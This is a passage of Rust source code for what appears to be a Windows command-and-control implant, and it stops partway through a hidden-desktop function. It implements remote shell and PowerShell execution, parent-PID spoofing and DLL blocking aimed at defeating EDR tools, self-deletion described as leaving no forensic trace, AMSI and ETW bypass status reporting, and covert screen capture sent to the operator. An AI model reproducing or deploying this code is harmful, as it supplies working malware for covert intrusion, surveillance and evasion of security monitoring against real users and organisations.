        out.push_str(&format!("{}\n", "-".repeat(58)));

        for i in 0..26u32 {
            if mask & (1 << i) == 0 { continue; }
            let letter = (b'A' + i as u8) as char;
            let root = format!("{}:\\\0", letter);
            let root_wide: Vec<u16> = root.encode_utf16().collect();

            let dtype = unsafe { GetDriveTypeW(root_wide.as_ptr()) };
            let type_str = drive_type_str(dtype);

            let mut free_caller: u64 = 0;
            let mut total: u64 = 0;
            let mut total_free: u64 = 0;
            let ok = unsafe {
                GetDiskFreeSpaceExW(root_wide.as_ptr(),
                    &mut free_caller, &mut total, &mut total_free)
            };

            if ok != 0 && total > 0 {
                let used = total - total_free;
                out.push_str(&format!("{:<6}  {:<10}  {:>12}  {:>12}  {:>12}\n",
                    format!("{}:", letter),
                    type_str,
                    fmt_bytes(total),
                    fmt_bytes(used),
                    fmt_bytes(total_free),
                ));
            } else {
                out.push_str(&format!("{:<6}  {:<10}  {:>12}  {:>12}  {:>12}\n",
                    format!("{}:", letter), type_str, "-", "-", "-"));
            }
        }
        (out, String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::from("drives: windows only\n"), String::new())
}

fn fmt_bytes(b: u64) -> String {
    const GB: u64 = 1_073_741_824;
    const MB: u64 = 1_048_576;
    if b >= GB { format!("{:.1} GB", b as f64 / GB as f64) }
    else if b >= MB { format!("{:.1} MB", b as f64 / MB as f64) }
    else { format!("{} KB", b / 1024) }
}

fn procinfo(args: &str) -> (String, String) {
    let pid: u32 = match args.trim().parse() {
        Ok(p)  => p,
        Err(_) => return (String::new(), "procinfo: PID required".into()),
    };
    #[cfg(target_os = "windows")] {
        use winapi::um::tlhelp32::*;
        let snap = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };
        if snap == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return (String::new(), "snapshot failed".into());
        }
        let mut pe = unsafe { std::mem::zeroed::<PROCESSENTRY32W>() };
        pe.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        unsafe {
            if Process32FirstW(snap, &mut pe) != 0 {
                loop {
                    if pe.th32ProcessID == pid {
                        let name = String::from_utf16_lossy(
                            &pe.szExeFile[..pe.szExeFile.iter().position(|&c| c == 0).unwrap_or(0)]);
                        winapi::um::handleapi::CloseHandle(snap);
                        return (format!("PID    : {}\nPPID   : {}\nThreads: {}\nName   : {}\n",
                            pe.th32ProcessID, pe.th32ParentProcessID, pe.cntThreads, name), String::new());
                    }
                    if Process32NextW(snap, &mut pe) == 0 { break; }
                }
            }
            winapi::um::handleapi::CloseHandle(snap);
        }
        (String::new(), format!("procinfo: PID {} not found", pid))
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

#[cfg(target_os = "windows")]
unsafe fn winapi_get_pid() -> u32 {
    winapi::um::processthreadsapi::GetCurrentProcessId()
}
#[cfg(not(target_os = "windows"))]
unsafe fn winapi_get_pid() -> u32 { std::process::id() }

// ============================================================
// Echo — handles "echo text" and "echo text > file"
// ============================================================

fn handle_echo(args: &str) -> (String, String) {
    // Check for redirect: "hello world > file.txt" or "hello >> file.txt"
    if let Some(idx) = args.find(">>") {
        let text = args[..idx].trim().trim_matches('"').trim_matches('\'');
        let file = args[idx+2..].trim();
        return inline_fs::echo_write(text, file, "append");
    }
    if let Some(idx) = args.find('>') {
        let text = args[..idx].trim().trim_matches('"').trim_matches('\'');
        let file = args[idx+1..].trim();
        return inline_fs::echo_write(text, file, "write");
    }
    // Plain echo — just return the text
    (args.trim_matches('"').trim_matches('\'').to_string(), String::new())
}

// ============================================================
// Shell commands — explicit spawns (operator chooses to use)
// ============================================================

fn run_shell(cmd: &str) -> (String, String) {
    // v3: postex spawn profile (profile [postex]) — spawnto swaps the shell
    // binary (e.g. a renamed cmd.exe), ppid spoofs the parent, blockdlls
    // blocks non-Microsoft DLLs in the child. None configured → v2 path.
    if let Some(px) = crate::core_agent::management::profile::postex() {
        let shell = if !px.spawnto.is_empty() {
            px.spawnto.clone()
        } else {
            std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".into())
        };
        return spawn_postex(&shell, &format!("/c {}", cmd), &px);
    }
    let shell = std::env::var("COMSPEC").unwrap_or_else(|_| "cmd.exe".into());
    exec_direct(&shell, &format!("/c {}", cmd))
}

fn run_powershell(cmd: &str) -> (String, String) {
    let ps_cmd = if cmd.is_empty() { "Get-Host | Select-Object Version".to_string() } else { cmd.to_string() };
    if let Some(px) = crate::core_agent::management::profile::postex() {
        return spawn_postex("powershell.exe", &format!("-NoProfile -NonInteractive -Command \"{}\"", ps_cmd), &px);
    }
    exec_direct("powershell.exe", &format!("-NoProfile -NonInteractive -Command \"{}\"", ps_cmd))
}

// ============================================================
// v3: Post-ex spawn engine — profile-controlled process creation
// ────────────────────────────────────────────────────────────
// px.ppid      → PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: child's parent in the
//                process tree becomes the spoofed image (EDR tree analysis
//                sees explorer.exe as the parent, not our beacon).
// px.blockdlls → PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY
//                BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: AV/EDR userland DLLs
//                refuse to load inside the child.
// Output capture: inherited anonymous pipe (1MB cap, 120s deadline + kill),
// mirroring exec_direct's containment.
// ============================================================
#[cfg(target_os = "windows")]
fn spawn_postex(binary: &str, args: &str, px: &crate::core_agent::management::profile::PostexCfg) -> (String, String) {
    use std::os::windows::ffi::OsStrExt;
    use std::sync::{Arc, Mutex};
    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE, SetHandleInformation};
    use winapi::um::minwinbase::SECURITY_ATTRIBUTES;
    use winapi::um::processthreadsapi::{
        DeleteProcThreadAttributeList, PROCESS_INFORMATION, STARTUPINFOW,
    };
    use winapi::um::winbase::STARTF_USESTDHANDLES;
    use winapi::um::namedpipeapi::CreatePipe;
    use winapi::um::processthreadsapi::{
        CreateProcessW, GetExitCodeProcess, InitializeProcThreadAttributeList,
        TerminateProcess, UpdateProcThreadAttribute,
        DeleteProcThreadAttributeList as DPTAL,
    };
    use winapi::um::synchapi::WaitForSingleObject;
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
        TH32CS_SNAPPROCESS,
    };
    use winapi::um::winbase::{CREATE_NO_WINDOW, HANDLE_FLAG_INHERIT,
        EXTENDED_STARTUPINFO_PRESENT};
    use winapi::um::winnt::HANDLE;
    type LPPATL = winapi::um::processthreadsapi::LPPROC_THREAD_ATTRIBUTE_LIST;

    // ── 1. Resolve spoofed parent PID (by image name) ──────────────────────
    let parent: Option<HANDLE> = if !px.ppid.is_empty() {
        unsafe {
            let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if snap != INVALID_HANDLE_VALUE {
                let mut entry: PROCESSENTRY32W = std::mem::zeroed();
                entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
                let want = px.ppid.to_lowercase();
                let mut found: Option<u32> = None;
                if Process32FirstW(snap, &mut entry) != 0 {
                    loop {
                        let len = entry.szExeFile.iter().position(|c| *c == 0).unwrap_or(0);
                        let name = String::from_utf16_lossy(&entry.szExeFile[..len]).to_lowercase();
                        if name == want {
                            found = Some(entry.th32ProcessID);
                            break;
                        }
                        if Process32NextW(snap, &mut entry) == 0 { break; }
                    }
                }
                CloseHandle(snap);
                match found {
                    Some(pid) => {
                        // Open with full rights so the handle can be inherited
                        // as PROC_THREAD_ATTRIBUTE_PARENT_PROCESS value.
                        let h = winapi::um::processthreadsapi::OpenProcess(
                            winapi::um::winnt::PROCESS_ALL_ACCESS, 0, pid);
                        if h.is_null() { None } else { Some(h) }
                    }
                    None => None,
                }
            } else { None }
        }
    } else { None };

    // ── 2. Attribute list: ppid spoof + blockdlls mitigation ───────────────
    let n_attrs: usize =
        (if parent.is_some() { 1 } else { 0 }) + (if px.blockdlls { 1 } else { 0 });
    if n_attrs == 0 {
        if let Some(h) = parent { unsafe { CloseHandle(h); } }
        // No postex attributes configured in practice → plain spawn path.
        return exec_direct(binary, args);
    }

    const PROC_THREAD_ATTRIBUTE_PARENT_PROCESS: usize = 0x0002_0000;
    const PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY:    usize = 0x0002_0002;
    const PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON: u64 = 0x1u64 << 44;

    let mut attr_size: usize = 0;
    unsafe {
        // Size query: pass NULL list.
        let _ = InitializeProcThreadAttributeList(
            std::ptr::null_mut(), n_attrs as u32, 0, &mut attr_size);
    }
    let mut attr_buf: Vec<u8> = vec![0u8; attr_size];
    let attr_list = attr_buf.as_mut_ptr() as LPPATL;
    unsafe {
        if InitializeProcThreadAttributeList(attr_list, n_attrs as u32, 0, &mut attr_size) == 0 {
            if let Some(h) = parent { CloseHandle(h); }
            return (String::new(), "postex: InitializeProcThreadAttributeList failed".into());
        }
        if let Some(hp) = parent {
            if UpdateProcThreadAttribute(
                attr_list, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS as usize,
                &hp as *const HANDLE as *mut _,
                std::mem::size_of::<HANDLE>(), std::ptr::null_mut(), std::ptr::null_mut(),
            ) == 0 {
                DPTAL(attr_list);
                CloseHandle(hp);
                return (String::new(), "postex: ppid attribute update failed".into());
            }
        }
        if px.blockdlls {
            let policy: u64 = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
            if UpdateProcThreadAttribute(
                attr_list, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY as usize,
                &policy as *const u64 as *mut _,
                std::mem::size_of::<u64>(), std::ptr::null_mut(), std::ptr::null_mut(),
            ) == 0 {
                DPTAL(attr_list);
                if let Some(hp) = parent { CloseHandle(hp); }
                return (String::new(), "postex: mitigation-policy attribute update failed".into());
            }
        }
    }

    // ── 3. Output pipe (child write end inheritable) ───────────────────────
    let mut sa = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: 1,
    };
    let mut read_h: HANDLE = std::ptr::null_mut();
    let mut write_h: HANDLE = std::ptr::null_mut();
    unsafe {
        if CreatePipe(&mut read_h, &mut write_h, &mut sa, 0) == 0 {
            DPTAL(attr_list);
            if let Some(hp) = parent { CloseHandle(hp); }
            return (String::new(), "postex: CreatePipe failed".into());
        }
        // Parent's read end must NOT be inherited.
        SetHandleInformation(read_h, HANDLE_FLAG_INHERIT, 0);
    }

    // ── 4. STARTUPINFOEXW (extended: attribute list + std handles) ─────────
    #[repr(C)]
    struct StartupInfoExW {
        StartupInfo: STARTUPINFOW,
        lpAttributeList: winapi::shared::minwindef::LPVOID,
    }
    let mut siex: StartupInfoExW = unsafe { std::mem::zeroed() };
    siex.StartupInfo.cb = std::mem::size_of::<StartupInfoExW>() as u32;
    siex.lpAttributeList = attr_list as winapi::shared::minwindef::LPVOID;
    siex.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
    siex.StartupInfo.hStdOutput = write_h;
    siex.StartupInfo.hStdError  = write_h;

    let mut cmdline: Vec<u16> = {
        let joined = if binary.contains(' ') {
            format!("\"{}\" {}", binary, args)
        } else {
            format!("{} {}", binary, args)
        };
        std::ffi::OsStr::new(&joined).encode_wide().chain(std::iter::once(0)).collect()
    };

    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };
    let flags = CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;
    let ok = unsafe {
        CreateProcessW(
            std::ptr::null(),
            cmdline.as_mut_ptr(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            1, // bInheritHandles
            flags,
            std::ptr::null_mut(),
            std::ptr::null(),
            &mut siex.StartupInfo,
            &mut pi,
        )
    };
    // Parent: close the write end immediately or reads never see EOF.
    unsafe { CloseHandle(write_h); }

    if ok == 0 {
        unsafe {
            CloseHandle(read_h);
            DPTAL(attr_list);
            if let Some(hp) = parent { CloseHandle(hp); }
        }
        return (String::new(), format!("postex: CreateProcessW failed (get_last_error {})", unsafe { winapi::um::errhandlingapi::GetLastError() }));
    }

    // ── 5. Drain output + wait with deadline ───────────────────────────────
    const MAX_CAPTURE: usize = 1_000_000;
    let buf: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
    let b2 = buf.clone();
    // HANDLE is *mut c_void (not Send) — ship it as usize into the thread.
    let handle_usize = read_h as usize;
    let drainer = std::thread::spawn(move || {
        let read_h_thread = handle_usize as HANDLE;
        let mut chunk = [0u8; 8192];
        loop {
            let n = unsafe {
                // ReadFile from the pipe read handle
                let mut got: u32 = 0;
                if winapi::um::fileapi::ReadFile(read_h_thread, chunk.as_mut_ptr() as *mut _,
                    chunk.len() as u32, &mut got, std::ptr::null_mut()) == 0 { 0usize } else { got as usize }
            };
            if n == 0 { break; }
            let mut g = b2.lock().unwrap();
            if g.len() < MAX_CAPTURE {
                let take = MAX_CAPTURE - g.len();
                g.extend_from_slice(&chunk[..n.min(take)]);
            }
        }
    });

    const EXEC_TIMEOUT_MS: u32 = 120_000;
    let wait = unsafe { WaitForSingleObject(pi.hProcess, EXEC_TIMEOUT_MS) };
    let mut note = String::new();
    if wait == 0x0000_0102 { // WAIT_TIMEOUT
        unsafe { TerminateProcess(pi.hProcess, 1); }
        note = "\n[postex] 120s timeout — child killed".into();
    }
    let mut code: u32 = 0;
    unsafe { GetExitCodeProcess(pi.hProcess, &mut code); }
    unsafe {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(read_h);
        DPTAL(attr_list);
        if let Some(hp) = parent { CloseHandle(hp); }
    }
    let _ = drainer.join();
    let out_bytes: Vec<u8> = buf.lock().unwrap().clone();
    let text = String::from_utf8_lossy(&out_bytes).to_string();
    (
        format!("{}{}\n[exit: {}]", text, note, code),
        String::new(),
    )
}

#[cfg(not(target_os = "windows"))]
fn spawn_postex(_binary: &str, _args: &str, _px: &crate::core_agent::management::profile::PostexCfg) -> (String, String) {
    (String::new(), String::new())
}

// ============================================================
// Environment
// ============================================================

fn env_list() -> (String, String) {
    let mut out = String::new();
    let mut vars: Vec<(String, String)> = std::env::vars().collect();
    vars.sort_by(|a, b| a.0.cmp(&b.0));
    for (k, v) in vars { out.push_str(&format!("{}={}\n", k, v)); }
    (out, String::new())
}

// ============================================================
// Process operations
// ============================================================

fn kill_pid(args: &str) -> (String, String) {
    let pid: u32 = match args.trim().parse() {
        Ok(p)  => p,
        Err(_) => return (String::new(), format!("kill: invalid PID {:?} (must be a number)", args.trim())),
    };
    #[cfg(target_os = "windows")] {
        use winapi::um::processthreadsapi::{OpenProcess, TerminateProcess};
        let handle = unsafe { OpenProcess(winapi::um::winnt::PROCESS_TERMINATE, 0, pid) };
        if handle.is_null() { return (String::new(), format!("kill: cannot open PID {} (access denied or not found)", pid)); }
        let r = unsafe { TerminateProcess(handle, 1) };
        unsafe { winapi::um::handleapi::CloseHandle(handle); }
        if r != 0 { (format!("Process {} terminated.", pid), String::new()) }
        else { (String::new(), format!("kill: failed to terminate PID {}", pid)) }
    }
    #[cfg(not(target_os = "windows"))]
    (format!("kill {}: stub", pid), String::new())
}

fn wipe_self() -> (String, String) {
    #[cfg(target_os = "windows")] {
        // OPSEC FIX (audit I-M10):
        //   OLD: wrote a .bat file to disk + spawned cmd.exe /c to delete
        //        the exe in a loop. The .bat file is a FORENSIC ARTIFACT
        //        ( Autoruns / Velociraptor / filesystem timeline will
        //        catch it). The cmd.exe spawn is logged by ETW process
        //        creation (Defender, Sysmon event 1).
        //   NEW: Use SetFileInformationByHandle with FileDispositionInfoEx
        //        (FILE_DISPOSITION_DELETE + FILE_DISPOSITION_POSIX_SEMANTICS).
        //        This marks the file for deletion-on-close. When the agent
        //        exits (process handle closes), Windows deletes the file.
        //        No .bat, no cmd.exe spawn, no second process — OPSEC clean.
        //        Available on Windows Vista+ (FILE_DISPOSITION_INFO) and
        //        Windows 10+ (FILE_DISPOSITION_INFO_EX with POSIX semantics).
        use std::ffi::OsStr;
        use std::os::windows::ffi::OsStrExt;

        #[repr(C)]
        #[derive(Default)]
        struct FileDispositionInfoEx {
            flags: u32,
        }

        const FILE_DISPOSITION_DELETE:    u32 = 0x00000001;
        const FILE_DISPOSITION_POSIX_SEMANTICS: u32 = 0x00000002;

        extern "system" {
            fn CreateFileW(
                name: *const u16, access: u32, share: u32,
                sa: *const u8, disp: u32, flags: u32, tmpl: *const u8,
            ) -> *mut u8;
            fn SetFileInformationByHandle(
                h: *mut u8, infoclass: u32, info: *const u8, infosize: u32,
            ) -> i32;
            fn CloseHandle(h: *mut u8) -> i32;
            fn DeleteFileW(name: *const u16) -> i32;
        }

        let exe = std::env::current_exe().unwrap_or_default();
        let exe_wide: Vec<u16> = exe.as_os_str().encode_wide().chain(std::iter::once(0)).collect();

        unsafe {
            // Open our own exe with DELETE access (no FILE_SHARE_DELETE needed
            // — we own the handle, and the file is still mapped as our image).
            const DELETE: u32 = 0x00010000;
            const FILE_SHARE_READ: u32 = 0x00000001;
            const OPEN_EXISTING: u32 = 3;
            const FILE_FLAG_BACKUP_SEMANTICS: u32 = 0x02000000;

            let h = CreateFileW(
                exe_wide.as_ptr(),
                DELETE,
                FILE_SHARE_READ,
                std::ptr::null(),
                OPEN_EXISTING,
                FILE_FLAG_BACKUP_SEMANTICS,  // needed for files still open/mapped
                std::ptr::null(),
            );

            if !h.is_null() && h as usize != !0usize {
                // Try FileDispositionInfoEx first (Win10+ — POSIX delete)
                let info = FileDispositionInfoEx {
                    flags: FILE_DISPOSITION_DELETE | FILE_DISPOSITION_POSIX_SEMANTICS,
                };
                let ok = SetFileInformationByHandle(
                    h,
                    21,  // FileDispositionInfoEx class
                    &info as *const _ as *const u8,
                    std::mem::size_of::<FileDispositionInfoEx>() as u32,
                );
                CloseHandle(h);

                if ok != 0 {
                    // File marked for POSIX deletion — will be deleted when
                    // the agent process exits. No .bat, no cmd.exe spawn.
                    std::process::exit(0);
                }
                // Fall through to legacy DeleteFileW approach
            }

            // Fallback: try DeleteFileW (may fail if file is still in use,
            // but on modern Windows, DELETE access allows marking for delete)
            let _ = DeleteFileW(exe_wide.as_ptr());
            std::process::exit(0);
        }
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

fn list_dlls() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::psapi::{EnumProcessModulesEx, GetModuleFileNameExW, LIST_MODULES_ALL};
        use winapi::um::processthreadsapi::OpenProcess;
        use winapi::um::winnt::{PROCESS_QUERY_INFORMATION, PROCESS_VM_READ};
        let mut out = String::new();
        let pid = unsafe { winapi::um::processthreadsapi::GetCurrentProcessId() };
        let handle = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, 0, pid) };
        if handle.is_null() { return (String::new(), "open process failed".into()); }
        let mut modules = [std::ptr::null_mut(); 1024];
        let mut needed = 0u32;
        unsafe {
            EnumProcessModulesEx(handle, modules.as_mut_ptr(),
                (modules.len() * std::mem::size_of::<*mut std::ffi::c_void>()) as u32,
                &mut needed, LIST_MODULES_ALL);
        }
        let count = needed as usize / std::mem::size_of::<*mut std::ffi::c_void>();
        let mut buf = [0u16; 260];
        for &m in &modules[..count.min(1024)] {
            if m.is_null() { continue; }
            unsafe {
                let len = GetModuleFileNameExW(handle, m, buf.as_mut_ptr(), 260);
                if len > 0 { out.push_str(&format!("{}\n", String::from_utf16_lossy(&buf[..len as usize]))); }
            }
        }
        unsafe { winapi::um::handleapi::CloseHandle(handle); }
        (out, String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

fn amsi_check() -> (String, String) {
    #[cfg(target_os = "windows")]
    {
        let amsi_patched = crate::core_agent::evasion::check_amsi_patched();
        let amsi_tech = crate::core_agent::evasion::get_amsi_technique_name();
        let etw_patched = crate::core_agent::evasion::check_etw_patched();
        let etw_tech = crate::core_agent::evasion::get_etw_technique_name();

        let mut output = String::new();
        output.push_str("=== EVASION STATUS ===\n");
        output.push_str(&format!("AMSI Patched  : {}\n", if amsi_patched { "YES" } else { "NO" }));
        output.push_str(&format!("AMSI Technique: {}\n", amsi_tech));
        output.push_str(&format!("ETW Patched   : {}\n", if etw_patched { "YES" } else { "NO" }));
        output.push_str(&format!("ETW Technique : {}\n", etw_tech));
        output.push_str("\n");
        if amsi_patched {
            output.push_str("[*] AMSI bypass is ACTIVE — scripts will not be scanned.\n");
        } else {
            output.push_str("[!] AMSI bypass is NOT active — Defender may catch scripts.\n");
        }
        if etw_patched {
            output.push_str("[*] ETW bypass is ACTIVE — telemetry is suppressed.\n");
        } else {
            output.push_str("[!] ETW bypass is NOT active — EDR telemetry is flowing.\n");
        }
        (output, String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::from("N/A (non-Windows)"), String::new())
}

fn screenshot() -> (String, String) {
    #[cfg(target_os = "windows")] {
        use winapi::um::winuser::{GetDesktopWindow, GetDC, ReleaseDC, GetSystemMetrics};
        use winapi::um::wingdi::*;
        use winapi::shared::windef::HGDIOBJ;
        let hwnd   = unsafe { GetDesktopWindow() };
        let hdc    = unsafe { GetDC(hwnd) };
        let w      = unsafe { GetSystemMetrics(0) };
        let h      = unsafe { GetSystemMetrics(1) };
        let mem_dc = unsafe { CreateCompatibleDC(hdc) };
        let hbm    = unsafe { CreateCompatibleBitmap(hdc, w, h) };
        let old    = unsafe { SelectObject(mem_dc, hbm as HGDIOBJ) };
        unsafe { BitBlt(mem_dc, 0, 0, w, h, hdc, 0, 0, SRCCOPY); }
        let size = (w * h * 4) as usize;
        let mut pixels = vec![0u8; size];
        let mut bmi: BITMAPINFO = unsafe { std::mem::zeroed() };
        bmi.bmiHeader.biSize        = std::mem::size_of::<BITMAPINFOHEADER>() as u32;
        bmi.bmiHeader.biWidth       = w;
        bmi.bmiHeader.biHeight      = -h;
        bmi.bmiHeader.biPlanes      = 1;
        // I5 FIX: request 32bpp — the copy loop below ALWAYS used a 4-byte-per-
        // pixel stride, but the old code captured 24bpp (3-byte stride), so the
        // assembled BMP was scrambled garbage. 32bpp matches the stride.
        bmi.bmiHeader.biBitCount    = 32;
        bmi.bmiHeader.biCompression = BI_RGB;
        // I5 FIX (secondary): GetDIBits must not be called while the bitmap is
        // still selected into a DC (MSDN) — unselect first.
        unsafe { SelectObject(mem_dc, old); }
        unsafe { GetDIBits(mem_dc, hbm, 0, h as u32, pixels.as_mut_ptr() as *mut _, &mut bmi, DIB_RGB_COLORS); }
        unsafe { DeleteObject(hbm as HGDIOBJ); DeleteDC(mem_dc); ReleaseDC(hwnd, hdc); }
        let row_size  = (w as usize * 3 + 3) & !3;
        let data_size = row_size * h as usize;
        let file_size = 54 + data_size;
        let mut bmp = vec![0u8; file_size];
        bmp[0] = b'B'; bmp[1] = b'M';
        bmp[2..4].copy_from_slice(&(file_size as u32).to_le_bytes());
        bmp[10..14].copy_from_slice(&54u32.to_le_bytes());
        bmp[14..18].copy_from_slice(&40u32.to_le_bytes());
        bmp[18..22].copy_from_slice(&(w as u32).to_le_bytes());
        // I5 FIX: capture is TOP-DOWN (biHeight = -h) but the BMP format is
        // BOTTOM-UP — write rows in reverse so the image is not flipped.
        bmp[22..26].copy_from_slice(&(h as u32).to_le_bytes());
        bmp[26..28].copy_from_slice(&1u16.to_le_bytes());
        bmp[28..30].copy_from_slice(&24u16.to_le_bytes());
        for y in 0..h as usize {
            let src = y * w as usize * 4;                       // 32bpp stride (BGRA)
            let dst = 54 + (h as usize - 1 - y) * row_size;     // bottom-up file rows
            for x in 0..w as usize {
                let si = src + x * 4;
                let di = dst + x * 3;
                bmp[di] = pixels[si]; bmp[di+1] = pixels[si+1]; bmp[di+2] = pixels[si+2];
            }
        }
        (crate::core_agent::commu::comms::base64_encode(&bmp), String::new())
    }
    #[cfg(not(target_os = "windows"))]
    (String::new(), String::new())
}

// ============================================================
// exec_direct — spawns a native exe, CREATE_NO_WINDOW
// ============================================================

pub(crate) fn exec_direct(cmd: &str, args: &str) -> (String, String) {
    let mut c = Command::new(cmd);
    if !args.is_empty() {
        for a in split_args(args) { c.arg(a); }
    }
    #[cfg(target_os = "windows")] {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        c.creation_flags(CREATE_NO_WINDOW);
    }
    // I7 FIX: Command::output() blocked FOREVER on the single beacon thread —
    // one hung child (`ping -t`, interactive installer, blocked UNC path) and
    // the beacon never checked in again. Also unbounded output could balloon
    // memory. Now: drain threads with a 1MB cap each + 120s deadline + kill.
    const EXEC_TIMEOUT_MS: u64 = 120_000;
    const MAX_CAPTURE: usize = 1_000_000;

    use std::io::Read;
    use std::process::Stdio;
    use std::sync::{Arc, Mutex};
    use std::time::{Duration, Instant};

    let mut child = match c.stdout(Stdio::piped()).stderr(Stdio::piped()).spawn() {
        Ok(ch) => ch,
        Err(e) => return (String::new(), format!("{}: {}", cmd, e)),
    };

    fn drain_pipe<R: Read + Send + 'static>(pipe: Option<R>, cap: usize) -> Arc<Mutex<Vec<u8>>> {
        let buf = Arc::new(Mutex::new(Vec::new()));
        let b2 = buf.clone();
        std::thread::spawn(move || {
            if let Some(mut p) = pipe {
                let mut chunk = [0u8; 8192];
                loop {
                    match p.read(&mut chunk) {
                        Ok(0) | Err(_) => break,
                        Ok(n) => {
                            let mut g = b2.lock().unwrap();
                            if g.len() < cap {
                                let take = cap - g.len();
                                g.extend_from_slice(&chunk[..n.min(take)]);
                            } // else: over cap — discard (still drains the pipe)
                        }
                    }
                }
            }
        });
        buf
    }

    let out_buf = drain_pipe(child.stdout.take(), MAX_CAPTURE);
    let err_buf = drain_pipe(child.stderr.take(), MAX_CAPTURE);

    let deadline = Instant::now() + Duration::from_millis(EXEC_TIMEOUT_MS);
    let mut timed_out = false;
    loop {
        match child.try_wait() {
            Ok(Some(_)) => break,
            Ok(None) => {
                if Instant::now() >= deadline {
                    let _ = child.kill();
                    let _ = child.wait(); // reap so drain pipes hit EOF
                    timed_out = true;
                    break;
                }
                std::thread::sleep(Duration::from_millis(100));
            }
            Err(e) => return (String::new(), format!("{}: {}", cmd, e)),
        }
    }

    // Pipes hit EOF once the child is gone — give the drain threads a moment.
    std::thread::sleep(Duration::from_millis(50));
    let stdout = String::from_utf8_lossy(&out_buf.lock().unwrap()).into_owned();
    let stderr = String::from_utf8_lossy(&err_buf.lock().unwrap()).into_owned();
    let mut result = stdout;
    if timed_out {
        if !result.is_empty() { result.push('\n'); }
        result.push_str(&format!("[TIMEOUT] {} killed after {}s", cmd, EXEC_TIMEOUT_MS / 1000));
    }
    if !stderr.is_empty() {
        if !result.is_empty() { result.push_str("\n[STDERR]\n"); }
        result.push_str(&stderr);
    }
    (result, String::new())
}

// ============================================================
// Helpers
// ============================================================

/// Returns the current working directory as a String.
/// Called after every command to populate TaskResult.cwd.
fn get_cwd() -> String {
    std::env::current_dir()
        .map(|p| p.display().to_string())
        .unwrap_or_default()
}

fn split_args(s: &str) -> Vec<String> {
    let mut out  = Vec::new();
    let mut cur  = String::new();
    let mut in_q = false;
    for c in s.chars() {
        match c {
            '"'           => in_q = !in_q,
            ' ' | '\t' if !in_q => { if !cur.is_empty() { out.push(cur.clone()); cur.clear(); } }
            _             => cur.push(c),
        }
    }
    if !cur.is_empty() { out.push(cur); }
    out
}

// ============================================================
// Hidden Desktop — stealth GUI operations on invisible desktop
//
// Two execution paths:
//   1. BOF mode (feature = "cffi"): loads hidden_desktop.x64.o via BOF loader
//   2. Inline mode (fallback): direct Win32 API calls from Rust
//
// Both paths create a hidden Windows desktop named "HEROHidden",
// switch the current thread to it, and run GUI operations invisibly.
// ============================================================

fn run_hidden_desktop(args: &str) -> (String, String) {
    #[cfg(not(target_os = "windows"))]
    {
        let _ = args;
        return ("hidden_desktop: windows only".into(), String::new());
    }

    #[cfg(target_os = "windows")]
    {
        // Try BOF first (if cffi feature enabled and .o compiled)
        #[cfg(all(feature = "cffi"))]
        {
            let (bof_out, bof_err) = crate::core_agent::exec::bof_bridge::execute_hidden_desktop_bof(args);
            if bof_err.is_empty() && !bof_out.is_empty() {
                return (bof_out, bof_err);
            }
            // If BOF failed, fall through to inline implementation
        }

        // Inline implementation — direct Win32 calls
        inline_hidden_desktop(args)
    }
}

/// Inline hidden desktop implementation using Win32 APIs.
/// No BOF needed — works out of the box.
#[cfg(target_os = "windows")]
fn inline_hidden_desktop(args: &str) -> (String, String) {
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;

    let parts = split_args(args);
    let sub = parts.get(0).map(|s| s.as_str()).unwrap_or("help");
    let sub_args = if parts.len() > 1 { parts[1..].join(" ") } else { String::new() };

    // Wide string helper
    fn wide(s: &str) -> Vec<u16> {
        OsStr::new(s).encode_wide().chain(std::iter::once(0)).collect()
    }

    extern "system" {
        fn CreateDesktopW(
            name: *const u16, device: *const u16, reserved: *const u16,
            flags: u32, access: u32, sa: *const u8,
        ) -> *mut u8;
        fn OpenDesktopW(
            name: *const u16, flags: u32, inherit: i32, access: u32,
        ) -> *mut u8;
        fn SetThreadDesktop(h: *mut u8) -> i32;
        fn GetThreadDesktop(tid: u32) -> *mut u8;
        fn CloseDesktop(h: *mut u8) -> i32;
        fn GetCurrentThreadId() -> u32;
        fn EnumDesktopsW(
            hwinsta: *mut u8, proc: extern "system" fn(*const u16, usize) -> i32, lparam: usize,
        ) -> i32;
        fn GetProcessWindowStation() -> *mut u8;
    }

    let desk_name = wide("HEROHidden");

    match sub {
        "start" | "create" | "init" => {
            unsafe {
                // Check if already exists
